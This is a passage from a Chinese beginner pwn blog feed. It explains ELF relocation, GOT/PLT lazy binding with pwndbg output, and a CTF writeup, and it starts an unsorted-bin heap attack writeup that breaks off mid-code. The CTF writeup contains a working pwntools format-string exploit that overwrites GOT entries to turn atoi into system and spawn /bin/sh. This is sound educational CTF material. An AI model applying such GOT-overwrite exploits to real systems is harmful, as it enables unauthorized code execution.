4</span><br><span class=\"line\">  [18] .eh_frame_hdr     PROGBITS        0804a008 002008 000054 00   A  0   0  4</span><br><span class=\"line\">  [19] .eh_frame         PROGBITS        0804a05c 00205c 000150 00   A  0   0  4</span><br><span class=\"line\">  [20] .init_array       INIT_ARRAY      0804bf04 002f04 000004 04  WA  0   0  4</span><br><span class=\"line\">  [21] .fini_array       FINI_ARRAY      0804bf08 002f08 000004 04  WA  0   0  4</span><br><span class=\"line\">  [22] .dynamic          DYNAMIC         0804bf0c 002f0c 0000e8 08  WA  7   0  4</span><br><span class=\"line\">  [23] .got              PROGBITS        0804bff4 002ff4 00000c 04  WA  0   0  4</span><br><span class=\"line\">  [24] .got.plt          PROGBITS        0804c000 003000 000020 04  WA  0   0  4</span><br><span class=\"line\">  [25] .data             PROGBITS        0804c020 003020 000008 00  WA  0   0  4</span><br><span class=\"line\">  [26] .bss              NOBITS          0804c028 003028 000004 00  WA  0   0  1</span><br><span class=\"line\">  [27] .comment          PROGBITS        00000000 003028 00002b 01  MS  0   0  1</span><br><span class=\"line\">  [28] .symtab           SYMTAB          00000000 003054 000480 10     29  45  4</span><br><span class=\"line\">  [29] .strtab           STRTAB          00000000 0034d4 000254 00      0   0  1</span><br><span class=\"line\">  [30] .shstrtab         STRTAB          00000000 003728 00011d 00      0   0  1</span><br><span class=\"line\">Key to Flags:</span><br><span class=\"line\">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class=\"line\">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class=\"line\">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class=\"line\">  p (processor specific)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"rel-plt\"><a href=\"#rel-plt\" class=\"headerlink\" title=\".rel.plt\"></a>.rel.plt</h3><p>​\t\t.rel.dyn是动态链接的二进制文件中需要重定位的变量的信息,.rel.plt是需要重定位的函数的信息</p>\n<p>​\t\t它的结构如下(以32位为例),两种类型区别见wiki</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf32_Addr        r_offset;</span><br><span class=\"line\">    Elf32_Word       r_info;</span><br><span class=\"line\">&#125; Elf32_Rel;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf32_Addr     r_offset;</span><br><span class=\"line\">    Elf32_Word    r_info;</span><br><span class=\"line\">    Elf32_Sword    r_addend;</span><br><span class=\"line\">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162230315.png\" alt=\"image-20230708162230315\"></p>\n<p>​\t\t最重要的就是前两个字段,r_offset,给出了需要重定位的位置,对于可执行文件而言,取值是需要重定位的<b>虚拟地址</b>,一般而言也就是GOT表的地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163140389.png\" alt=\"image-20230708163140389\"></p>\n<p>​\t\tGOT表中开始存放的值是这个</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163342737.png\" alt=\"image-20230708163342737\"></p>\n<p>​\t\t这玩意也就是plt表,要进行真正解析的地方</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708163428111.png\" alt=\"image-20230708163428111\"></p>\n<p>​\t\tr_info给出需要重定位的符号的符号表索引,以及相应的重定位类型. <b>换句话说,第一个参数是告诉你要把哪里的值进行修改,这个参数是告诉你,要修改哪个符号.</b></p>\n<ul>\n<li>高三个字节对应的值表示这个动态符号在.dynsym符号表中的位置</li>\n<li>最低字节表示的是重定位类型</li>\n</ul>\n<h3 id=\"dynsym\"><a href=\"#dynsym\" class=\"headerlink\" title=\".dynsym\"></a>.dynsym</h3><p>​\t\t结构如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Word    st_name;   <span class=\"comment\">/* Symbol name (string tbl index) */</span></span><br><span class=\"line\">  Elf32_Addr    st_value;  <span class=\"comment\">/* Symbol value */</span></span><br><span class=\"line\">  Elf32_Word    st_size;   <span class=\"comment\">/* Symbol size */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span> st_info;   <span class=\"comment\">/* Symbol type and binding */</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span> st_other;  <span class=\"comment\">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class=\"line\">  Elf32_Section st_shndx;  <span class=\"comment\">/* Section index */</span></span><br><span class=\"line\">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个在ida中也是没有直接给出的,可以用readelf查看然后寻找.</p>\n<p>​\t\t其中比较重要的字段</p>\n<ul>\n<li>st_name 保存着动态符号在.dynstr表(动态字符串表)中的偏移</li>\n<li>st_value 如果这个符号被导出,这个符号保存着对应的虚拟地址</li>\n</ul>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708164800762.png\" alt=\"image-20230708164800762\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Elf32_Sym &lt;offset aRead - offset unk_80482E8, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>h, <span class=\"number\">0</span>, <span class=\"number\">0</span>&gt; ; <span class=\"string\">&quot;read&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t以read为例,aRead是这个符号的虚拟地址, 减去符号表开始的虚拟地址,就得到了偏移, read的这个值为0x27</p>\n<p>0x804830F - 0x80482E8 &#x3D; 0x27,也就是read这个字符串开始的地方,(以及他们每个字符串结束后都有个0,位置结束符号)</p>\n<p>​\t\tdynstr表如下</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708165101316.png\" alt=\"image-20230708165101316\"></p>\n<h3 id=\"dynmaic\"><a href=\"#dynmaic\" class=\"headerlink\" title=\".dynmaic\"></a>.dynmaic</h3><p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708172738811.png\" alt=\"image-20230708172738811\"></p>\n<h2 id=\"解析过程\"><a href=\"#解析过程\" class=\"headerlink\" title=\"解析过程\"></a>解析过程</h2><h1 id=\"got-plt-got-plt-延迟绑定\"><a href=\"#got-plt-got-plt-延迟绑定\" class=\"headerlink\" title=\"got plt .got.plt 延迟绑定\"></a>got plt .got.plt 延迟绑定</h1><h2 id=\"got表-got-plt表\"><a href=\"#got表-got-plt表\" class=\"headerlink\" title=\"got表 got.plt表\"></a>got表 got.plt表</h2><p>​\t\tGloble offset table全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址，GOT表存储在数据段，（在IDA中是也就是.data段）可以在程序运行中被修改。</p>\n<p>​\t\t.got 存放全局变量引用</p>\n<p>​\t\t.got.plt 存放需要延迟绑定的函数</p>\n<p>​\t\tgot表的初始状态指向一段plt,首次调用时会由plt表中指令进行解析,得到真正的函数地址(即内存中的地址)并填入相应的got表项</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230228164021947.png\" alt=\"image-20230228164021947\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132148041.png\" alt=\"image-20230303132148041\"></p>\n<h2 id=\"plt表\"><a href=\"#plt表\" class=\"headerlink\" title=\"plt表\"></a>plt表</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132136453.png\" alt=\"image-20230303132136453\"></p>\n<p><a href=\"https://blog.csdn.net/qq_52126646/article/details/119494939\">https://blog.csdn.net/qq_52126646/article/details/119494939</a></p>\n<h2 id=\"延迟绑定\"><a href=\"#延迟绑定\" class=\"headerlink\" title=\"延迟绑定\"></a>延迟绑定</h2><p>​\t\t以上一篇博客的题目为例</p>\n<p>​\t\tcall一个函数的时候,先到plt     0x400650 &lt;system@plt&gt;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p system</span><br><span class=\"line\">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400650 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t然后plt里面第一条 jmp     cs:off_600D38 这里会跳到 system@got的地址,(此时还没有初始化)</p>\n<p>​\t\tdisplay &#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; display /3i $rip</span><br><span class=\"line\">2: x/3i $rip</span><br><span class=\"line\">=&gt; 0x400650 &lt;system@plt&gt;:\tjmp    QWORD PTR [rip+0x2006e2]        # 0x600d38</span><br><span class=\"line\">   0x400656 &lt;system@plt+6&gt;:\tpush   0x2</span><br><span class=\"line\">   0x40065b &lt;system@plt+11&gt;:\tjmp    0x40062</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t之后,0x600d38里面的地址是system@plt刚才jmp的下一条,push 0x2,然后再jmp 0x40062,也就是PLT[0],跳转到动态链接器进行地址解析.找到真正的地址,填入got地址,也就是0x600d38,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20wx 0x600d38</span><br><span class=\"line\">0x600d38:\t0x00400656\t0x00000000\t0xf7a46e40\t0x00007fff</span><br><span class=\"line\">0x600d48:\t0xf7a46f10\t0x00007fff\t0xf7af2020\t0x00007fff</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0000000000400650 ; int system(const char *command)</span><br><span class=\"line\">.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p</span><br><span class=\"line\">.plt:0000000000400650                 jmp     cs:off_600D38</span><br><span class=\"line\">.plt:0000000000400650 _system         endp</span><br><span class=\"line\">.plt:0000000000400650</span><br><span class=\"line\">.plt:0000000000400656 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.plt:0000000000400656                 push    2</span><br><span class=\"line\">.plt:000000000040065B                 jmp     sub_400620</span><br><span class=\"line\">  </span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t下次在执行的时候,直接就plt-&gt;got的第一个jmp -&gt; 实际地址,也就是说0x600d38里存储的是system的真实内存地址了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">20</span>wx <span class=\"number\">0x600d38</span></span><br><span class=\"line\"><span class=\"number\">0x600d38</span>:\t<span class=\"number\">0xf7a31420</span>\t<span class=\"number\">0x00007fff</span>\t<span class=\"number\">0xf7a46e40</span>\t<span class=\"number\">0x00007fff</span></span><br><span class=\"line\"><span class=\"number\">0x600d48</span>:\t<span class=\"number\">0xf7a46f10</span>\t<span class=\"number\">0x00007fff</span>\t<span class=\"number\">0xf7af2020</span>\t<span class=\"number\">0x00007fff</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">20</span>wx <span class=\"number\">0x00007ffff7a31420</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31420</span> &lt;__libc_system&gt;:\t<span class=\"number\">0x74ff8548</span>\t<span class=\"number\">0xfa66e90b</span>\t<span class=\"number\">0x0f66ffff</span>\t<span class=\"number\">0x0000441f</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31430</span> &lt;__libc_system+<span class=\"number\">16</span>&gt;:\t<span class=\"number\">0x593d8d48</span>\t<span class=\"number\">0x48001649</span>\t<span class=\"number\">0xe808ec83</span>\t<span class=\"number\">0xfffffa50</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31440</span> &lt;__libc_system+<span class=\"number\">32</span>&gt;:\t<span class=\"number\">0x940fc085</span>\t<span class=\"number\">0xc48348c0</span>\t<span class=\"number\">0xc0b60f08</span>\t<span class=\"number\">0x001f0fc3</span></span><br><span class=\"line\"><span class=\"number\">0x7ffff7a31450</span> &lt;__GI___realpath&gt;:\t<span class=\"number\">0xe5894855</span>\t<span class=\"number\">0x56415741</span>\t<span class=\"number\">0x54415541</span>\t<span class=\"number\">0xec814853</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/",
            "title": "pwn入门-11-2月月赛题及反思",
            "date_published": "2023-02-26T01:56:50.000Z",
            "content_html": "<p>​\t\t2.25号月赛,只有一道pwn题,格式化字符串,其实本身抱着一种相对良好的心态,觉得自己学了一段时间了,前段时间刚看的格式化字符串,应该没什么问题………但还是寄了,其他方向队友都做出来了,就只剩自己这一道pwn题了…感觉比较受打击……</p>\n<p>​\t\t在做题的时候,漏洞点很明显,关于如何利用,自己想了很多很多,越想越复杂,越搞心态越崩.结束后看了下exp,其实比自己想的简单多的多.</p>\n<p>​\t\t总结一下,问题有好几个,一个是调试程序不熟练,浪费很多时间,最重要的一个问题还是<font color=\"red\">基础不牢,有些点想不到或者模棱两可,逻辑链连不上,就很容易想复杂</font>,不确定可不可以,就导致了自己很犹豫要不要尝试一下这种攻击手法</p>\n<p>​\t\t这道题其实就是替换函数地址的事,主要是要搞清楚plt,got的关系以及延迟绑定就可以了.</p>\n<p>​\t\t题目链接:<a href=\"https://tangzichengcc.github.io/2023/02/26/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/ezfmt\">https://tangzichengcc.github.io/2023/02/26/pwn入门-11-2月月赛题及反思/ezfmt</a></p>\n<p>​\t\texp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./ezfmt&#x27;</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Choice:&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b *0x04008E1&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#payload=&#x27;aaaaaaaa&#x27;+&#x27;%6$p&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#system plt -&gt;main</span></span><br><span class=\"line\"><span class=\"comment\">#atoi -&gt; system got</span></span><br><span class=\"line\"></span><br><span class=\"line\">system_got=<span class=\"number\">0x000000000600D38</span></span><br><span class=\"line\">again=<span class=\"number\">0x00000000004007B7</span>  <span class=\"comment\">#选择 </span></span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got=<span class=\"number\">0x600D70</span></span><br><span class=\"line\">system_plt=<span class=\"number\">0x400656</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=fmtstr_payload(<span class=\"number\">6</span>,&#123;system_got:again,atoi_got:system_plt&#125;)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t1.替换的是.got.plt里的地址 , 替换成的again就是.text段sub_4007B7的地址,这样的话,就可以劫持控制流,再次回来.</p>\n<p>​\t\t意思就是call system的时候先去plt,然后进got.plt里的地址,就直接执行4007b7的指令了,没问题</p>\n<p>​\t\t2.同时把获取选择参数的函数atoi换成system(这里为什么又是plt了呢? 因为system的got表里地址还没有初始化,而且被替换了,那就只能是plt,如果初始化了呢? 调用应该也没问题,都是一样的代码,)</p>\n<p>​\t\tatoi的got地址,换成system的plt地址的话, call atoi –&gt; atoi的plt–&gt;atoi的got –&gt; system的plt –&gt; system的got<font color=\"red\">(注意,这里不一样了,这里不是got的第一条指令,如果是的话,就还是跳到我们第一步覆盖的again那里了,覆盖的是下一条,就是push,然后jump到dl_runtime_resolve初始化那里) plt具体内容等下一篇博客写吧,正常来说,400650才是它的开头,但不能跳到这里,不然就到again了下一条就可以了</font></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt:0000000000400650 ; int system(const char *command)</span><br><span class=\"line\">.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p</span><br><span class=\"line\">.plt:0000000000400650                 jmp     cs:off_600D38</span><br><span class=\"line\">.plt:0000000000400650 _system         endp</span><br><span class=\"line\">.plt:0000000000400650</span><br><span class=\"line\">.plt:0000000000400656 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.plt:0000000000400656                 push    2</span><br><span class=\"line\">.plt:000000000040065B                 jmp     sub_400620</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t注意最后要再给它输入一个&#x2F;bin&#x2F;sh, \\x00好像无所谓的</p>\n<p>​\t\tcontext.arch&#x3D;’amd64’ 如果不加的话也会有问题,为啥呢……….?</p>\n<p>​\t\t如何进行 调试呢??? 可以看看xuanxuan那个博客</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/",
            "title": "pwn入门-10-堆入门之堆溢出及unsorted_bin攻击",
            "date_published": "2023-02-24T02:06:55.000Z",
            "content_html": "<p>​\t\t堆题其实是目前比较基础的题,栈题都比较少了貌似…自己的进度有点慢,虽然上学期接触到了堆,但也学的一知半解.</p>\n<p>​\t\t最近上了NeSE创始人、带队老师龚老师的课,老师第一节课给的测试题就是一道堆题,看了看他后面的课件,重点也在堆上,所以觉得可以先把栈什么的稍微放一放了,基础其实差不多了,提升的话,可以慢慢来,先赶紧继续学堆.</p>\n<p>​\t\t</p>\n<p>题目链接: 本篇博客地址url + oork_note即可</p>\n<h1 id=\"unsorted-bin基础知识\"><a href=\"#unsorted-bin基础知识\" class=\"headerlink\" title=\"unsorted bin基础知识\"></a>unsorted bin基础知识</h1><p>参考:<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/</a></p>\n<p>​\t\tUnsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>\n<p>​\t\tUnsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>\n<h2 id=\"基本来源\"><a href=\"#基本来源\" class=\"headerlink\" title=\"基本来源\"></a>基本来源</h2><ol>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li>\n<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li>\n</ol>\n<h2 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h2><pre><code>     在 [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) 中的 `_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck-&gt;fd` 的位置写入本 Unsorted Bin 的位置,就是一个很大的值,比如0xffffffffxxxx\n</code></pre>\n<p>​\t换句话说, bck-&gt;fd 也就是 bk(也就是要修改的地址,所以溢出修改的chunk的bk应该是要修改的地址-0x10),  victim-&gt;bk-&gt;fd &#x3D; victim</p>\n<p>​\tav是当前chunk, (av)-&gt;bk &#x3D; bck,就是当前chunk的bk, 晕了晕了,回头看看源码 victim, av什么的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303140544704.png\" alt=\"image-20230303140544704\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* remove from unsorted list */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">  malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class=\"line\">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"测试题目-oork-note\"><a href=\"#测试题目-oork-note\" class=\"headerlink\" title=\"测试题目 oork_note\"></a>测试题目 oork_note</h1><p>​\t\t一看就是一道堆题,给出了一个菜单.然后会让你输入7次,也就是一周的日记,要输入长度和内容,这里没有问题,<font color=\"red\">注意一个细节,就是你输入的长度会有个操作 v2 +&#x3D; 144;  也就是增大了0x90,这个后面会用到</font></p>\n<p>​\t\t然后就是编辑和删除操作了,</p>\n<p>​\t\t拿flag其实很明显,就是要把0x6020D4的值修改为一个比167大的值就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sub_4008F6();</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to 997 wellfare! This program records your weekly workloads.&quot;</span>);</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v4 &lt;= <span class=\"number\">6</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Day %d in this weekend.\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(v4 + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v5 += sub_400939(v4++);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Do you need to edit your note? y/n&quot;</span>);</span><br><span class=\"line\">  getchar();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( getchar() == <span class=\"number\">121</span> )</span><br><span class=\"line\">    sub_400B62();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_6020D4 &gt; <span class=\"number\">167</span> )</span><br><span class=\"line\"> 